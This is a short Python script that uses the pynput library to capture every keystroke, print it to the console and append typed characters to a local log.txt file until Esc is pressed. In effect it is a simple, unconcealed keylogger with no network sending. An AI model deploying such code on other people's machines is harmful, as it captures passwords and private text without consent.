from pynput.keyboard import Key, Listener

numbers = {
    '<96>': '0', '<97>': '1', '<98>': '2', '<99>': '3', '<100>': '4', '<101>': '5', '<102>': '6', '<103>': '7',
    '<104>': '8', '<105>': '9'
}


def on_press(key):
    key = str(key).replace("'", "")

    try:
        if key.find('>') > 0:
            key = numbers[key]
    except KeyError:
        key = "?Error?"

    print(f"{key} pressed")

    with open("log.txt", "a") as f:
        if key.find("space") > 0:
            f.write(' ')
        elif key.find("enter") > 0:
            f.write('\n')
        elif key.find("Key") == -1:
            f.write(key)


def on_release(key):
    if key == Key.esc:
        return False


def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            if key.find("space") > 0:
                f.write('  ')
            elif key.find("Key") == -1:
                f.write(key)


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
